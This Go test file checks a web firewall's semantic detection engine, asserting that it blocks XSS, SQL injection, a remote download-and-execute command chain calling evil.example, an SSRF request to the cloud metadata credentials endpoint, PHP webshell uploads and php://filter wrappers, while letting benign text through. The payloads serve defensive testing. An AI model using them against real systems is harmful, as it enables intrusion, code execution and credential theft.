package detection

import (
	"context"
	"net/http"
	"strings"
	"testing"
)

func TestSemanticEngineObservesEntropyAsAuxiliarySignal(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{URI: "/search", Args: map[string][]string{"q": {"<script>alert(1)</script>"}}})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionBlock {
		t.Fatalf("expected executable XSS evidence to block, got %q", result.Decision)
	}
	if !hasMatch(result, SemanticEntropyRuleID) {
		t.Fatalf("expected entropy semantic match, got %+v", result.Matches)
	}
	if entropyMatch := matchByID(result, SemanticEntropyRuleID); entropyMatch.Action != RuleActionLog {
		t.Fatalf("expected entropy to log only, got %+v", entropyMatch)
	}
}

func TestSemanticEngineBlocksSQLTaintPayload(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{Body: "SELECT load_file('/etc/passwd')"})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionBlock {
		t.Fatalf("expected semantic block decision, got %q", result.Decision)
	}
	match := matchByID(result, SemanticSQLTaintRuleID)
	if match.ID == 0 {
		t.Fatalf("expected SQL taint semantic match, got %+v", result.Matches)
	}
	if match.Group != "sqli" || match.Severity != "critical" || match.Score < 8 {
		t.Fatalf("expected SQL evidence metadata, got %+v", match)
	}
}

func TestSemanticEngineBlocksJSTaintPayload(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{Body: "eval(location.hash)"})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionBlock {
		t.Fatalf("expected semantic block decision, got %q", result.Decision)
	}
	match := matchByID(result, SemanticJSTaintRuleID)
	if match.ID == 0 {
		t.Fatalf("expected JS taint semantic match, got %+v", result.Matches)
	}
	if match.Group != "xss" || match.Severity != "high" || match.Score < 7 {
		t.Fatalf("expected XSS evidence metadata, got %+v", match)
	}
}

func TestSemanticEngineDoesNotBlockEntropyOnlyPayload(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{URI: "/search", Args: map[string][]string{"q": {"a0f9e8d7c6b5a493827160fedcba9876543210"}}})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionAllow {
		t.Fatalf("expected entropy-only payload to allow, got %q with %+v", result.Decision, result.Matches)
	}
}

func TestSemanticEngineAllowsBenignRequest(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{Method: "GET", URI: "/api/users", Args: map[string][]string{"id": {"123"}}})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionAllow {
		t.Fatalf("expected allow decision, got %q", result.Decision)
	}
	if len(result.Matches) != 0 {
		t.Fatalf("expected no semantic matches, got %+v", result.Matches)
	}
}

func TestSemanticEnginePreservesBaseMatches(t *testing.T) {
	base := &stubEngine{result: Result{Decision: DecisionBlock, Matches: []MatchedRule{{ID: 100, Message: "base", Action: RuleActionDeny}}}}
	engine := NewSemanticEngine(base, SemanticOptions{})

	result, err := engine.Inspect(context.Background(), Request{URI: "/base"})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionBlock {
		t.Fatalf("expected base block decision, got %q", result.Decision)
	}
	if !hasMatch(result, 100) {
		t.Fatalf("expected base match to be preserved, got %+v", result.Matches)
	}
}

func TestT144EncodedSQLAndXSSPayloadsNormalizeAndMatch(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	tests := []struct {
		name       string
		req        Request
		ruleID     int
		normalized string
		evidence   string
	}{
		{
			name:       "encoded sql comment bypass",
			req:        Request{URI: "/search", Args: map[string][]string{"q": {"un/**/ion%20sel/**/ect password"}}},
			ruleID:     SemanticSQLChopRuleID,
			normalized: "union select",
			evidence:   "normalization:encoded_payload",
		},
		{
			name:       "encoded xss script",
			req:        Request{URI: "/search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
			ruleID:     SemanticXSSChopRuleID,
			normalized: "<script>",
			evidence:   "normalization:encoded_payload",
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result, err := engine.Inspect(context.Background(), tc.req)
			if err != nil {
				t.Fatalf("Inspect returned error: %v", err)
			}
			if result.Decision != DecisionBlock {
				t.Fatalf("decision=%q, want block; matches=%+v", result.Decision, result.Matches)
			}
			match := matchByID(result, tc.ruleID)
			if match.ID == 0 {
				t.Fatalf("missing semantic rule %d in %+v", tc.ruleID, result.Matches)
			}
			if !strings.Contains(match.Message, tc.normalized) {
				t.Fatalf("message missing normalized value %q: %s", tc.normalized, match.Message)
			}
			if !containsEvidence(match.Evidence, tc.evidence) {
				t.Fatalf("evidence missing %q: %+v", tc.evidence, match.Evidence)
			}
		})
	}
}

func TestT144EntropyOnlyNeverBlocks(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{EntropyThreshold: 0.01, BlockOnEntropy: true, BlockOnTaint: true})

	result, err := engine.Inspect(context.Background(), Request{URI: "/search", Args: map[string][]string{"q": {"a0f9e8d7c6b5a493827160fedcba9876543210zzzz"}}})
	if err != nil {
		t.Fatalf("Inspect returned error: %v", err)
	}
	if result.Decision != DecisionAllow {
		t.Fatalf("entropy-only decision=%q, want allow; matches=%+v", result.Decision, result.Matches)
	}
	for _, match := range result.Matches {
		if match.ID == SemanticEntropyRuleID && match.Action == RuleActionDeny {
			t.Fatalf("entropy match must not deny: %+v", match)
		}
	}
}

func TestT151SemanticEngineMatchesExpandedCategories(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	tests := []struct {
		name             string
		req              Request
		ruleID           int
		group            string
		source           string
		normalizedSubstr string
		requiredEvidence []string
		minScore         int
		wantAction       RuleAction
	}{
		{
			name:             "encoded sqli union variant",
			req:              Request{URI: "/search", Args: map[string][]string{"q": {"un/**/ion%20sel/**/ect password from users --"}}},
			ruleID:           SemanticSQLChopRuleID,
			group:            "sqli",
			source:           "semantic/sqlchop",
			normalizedSubstr: "union select password from users",
			requiredEvidence: []string{"structure:comment_bypass", "normalization:encoded_payload", "structure:union_query"},
			minScore:         8,
			wantAction:       RuleActionDeny,
		},
		{
			name:             "encoded xss script variant",
			req:              Request{URI: "/search?q=%253Csvg%2520onload%253Dalert%25281%2529%253E"},
			ruleID:           SemanticXSSChopRuleID,
			group:            "xss",
			source:           "semantic/xsschop",
			normalizedSubstr: "<svg onload=alert(1)>",
			requiredEvidence: []string{"normalization:encoded_payload", "token:event_handler", "structure:svg_context"},
			minScore:         7,
			wantAction:       RuleActionDeny,
		},
		{
			name:             "rce command chain",
			req:              Request{Body: "cmd=sh -c 'curl http://evil.example/p.sh|sh && whoami'"},
			ruleID:           SemanticRCEChopRuleID,
			group:            "rce",
			source:           "semantic/rcechop",
			normalizedSubstr: "curl http://evil.example/p.sh|sh && whoami",
			requiredEvidence: []string{"token:download_execute", "structure:command_chain", "token:recon_command"},
			minScore:         8,
			wantAction:       RuleActionDeny,
		},
		{
			name:             "ssrf metadata target",
			req:              Request{Method: http.MethodGet, URI: "/fetch", Args: map[string][]string{"url": {"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}},
			ruleID:           SemanticSSRFChopRuleID,
			group:            "ssrf",
			source:           "semantic/ssrfchop",
			normalizedSubstr: "169.254.169.254/latest/meta-data",
			requiredEvidence: []string{"token:request_sink", "token:metadata_endpoint", "structure:internal_host"},
			minScore:         7,
			wantAction:       RuleActionDeny,
		},
		{
			name:             "upload double extension multipart",
			req:              Request{Headers: http.Header{"Content-Type": {"multipart/form-data; boundary=test"}}, Body: "------test\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"avatar.jpg.php\"\r\nContent-Type: application/octet-stream\r\n\r\nbenign marker for upload test\r\n------test--"},
			ruleID:           SemanticUploadRuleID,
			group:            "upload",
			source:           "semantic/uploadchop",
			normalizedSubstr: "filename=\"avatar.jpg.php\"",
			requiredEvidence: []string{"structure:upload_carrier", "structure:double_extension", "structure:multipart_filename"},
			minScore:         8,
			wantAction:       RuleActionDeny,
		},
		{
			name: "upload metadata path traversal risk",
			req: Request{
				Method:  http.MethodPost,
				URI:     "/upload",
				Headers: http.Header{"Content-Type": {"multipart/form-data; boundary=test"}},
				Args: map[string][]string{
					"upload":              {"shell.php"},
					"upload.filename":     {"shell.php"},
					"upload.extension":    {".php"},
					"upload.content_type": {"application/octet-stream"},
					"upload.risk":         {"path_traversal", "executable_extension"},
				},
			},
			ruleID:           SemanticUploadRuleID,
			group:            "upload",
			source:           "semantic/uploadchop",
			normalizedSubstr: "path_traversal",
			requiredEvidence: []string{"structure:file_risk", "structure:path_traversal", "token:webshell_extension"},
			minScore:         8,
			wantAction:       RuleActionDeny,
		},
		{
			name: "upload metadata content mismatch",
			req: Request{
				Method:  http.MethodPost,
				URI:     "/upload",
				Headers: http.Header{"Content-Type": {"multipart/form-data; boundary=test"}},
				Args: map[string][]string{
					"upload":              {"avatar.png"},
					"upload.filename":     {"avatar.png"},
					"upload.extension":    {".png"},
					"upload.content_type": {"image/png"},
					"upload.magic":        {"pdf"},
					"upload.risk":         {"content_type_mismatch"},
				},
			},
			ruleID:           SemanticUploadRuleID,
			group:            "upload",
			source:           "semantic/uploadchop",
			normalizedSubstr: "content_type_mismatch",
			requiredEvidence: []string{"structure:file_risk", "structure:content_type_mismatch"},
			minScore:         8,
			wantAction:       RuleActionDeny,
		},
		{
			name:             "protocol wrapper carrier",
			req:              Request{URI: "/proxy", Args: map[string][]string{"resource": {"php://filter/convert.base64-encode/resource=index.php"}}},
			ruleID:           SemanticProtoRuleID,
			group:            "protocol",
			source:           "semantic/protochop",
			normalizedSubstr: "php://filter/convert.base64-encode/resource=index.php",
			requiredEvidence: []string{"token:dangerous_scheme", "structure:protocol_wrapper"},
			minScore:         6,
			wantAction:       RuleActionDeny,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			result, err := engine.Inspect(context.Background(), tc.req)
			if err != nil {
				t.Fatalf("Inspect returned error: %v", err)
			}
			if result.Decision != DecisionBlock {
				t.Fatalf("decision=%q, want block; matches=%+v", result.Decision, result.Matches)
			}
			match := matchByID(result, tc.ruleID)
			if match.ID == 0 {
				t.Fatalf("missing semantic rule %d in %+v", tc.ruleID, result.Matches)
			}
			if match.Group != tc.group || match.Source != tc.source {
				t.Fatalf("unexpected metadata: %+v", match)
			}
			if match.Score < tc.minScore || match.Action != tc.wantAction {
				t.Fatalf("unexpected score/action: %+v", match)
			}
			if !strings.Contains(match.Message, tc.normalizedSubstr) {
				t.Fatalf("message missing normalized value %q: %s", tc.normalizedSubstr, match.Message)
			}
			for _, item := range tc.requiredEvidence {
				if !containsEvidence(match.Evidence, item) {
					t.Fatalf("evidence missing %q: %+v", item, match.Evidence)
				}
			}
		})
	}
}

func TestT151SemanticEngineAllowsOrdinaryTechnicalText(t *testing.T) {
	engine := NewSemanticEngine(nil, SemanticOptions{})

	tests := []Request{
		{Method: http.MethodGet, URI: "/docs", Args: map[string][]string{"q": {"documentation about curl, bash, and command pipelines for CI runners"}}},
		{Method: http.MethodGet, URI: "/wiki", Args: map[string][]string{"url": {"https://example.com/docs/api/callback-url-setup"}}},
		{Method: http.MethodPost, URI: "/notes", Body: "Example multipart/form-data filename handling for avatar.jpg uploads in nginx docs"},
		{Method: http.MethodGet, URI: "/search", Args: map[string][]string{"resource": {"Protocol wrappers like php://filter are discussed in a security article"}}},
	}
	for _, req := range tests {
		result, err := engine.Inspect(context.Background(), req)
		if err != nil {
			t.Fatalf("Inspect returned error: %v", err)
		}
		if result.Decision != DecisionAllow {
			t.Fatalf("ordinary technical text blocked: req=%+v result=%+v", req, result)
		}
	}
}

func hasMatch(result Result, id int) bool {
	for _, match := range result.Matches {
		if match.ID == id {
			return true
		}
	}
	return false
}

func matchByID(result Result, id int) MatchedRule {
	for _, match := range result.Matches {
		if match.ID == id {
			return match
		}
	}
	return MatchedRule{}
}

func containsEvidence(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

type stubEngine struct {
	result Result
	rules  []Rule
}

func (s *stubEngine) Start(context.Context) error  { return nil }
func (s *stubEngine) Stop(context.Context) error   { return nil }
func (s *stubEngine) Reload(context.Context) error { return nil }
func (s *stubEngine) Inspect(context.Context, Request) (Result, error) {
	return s.result, nil
}
func (s *stubEngine) Rules() []Rule         { return s.rules }
func (s *stubEngine) EnableRule(int) error  { return nil }
func (s *stubEngine) DisableRule(int) error { return nil }
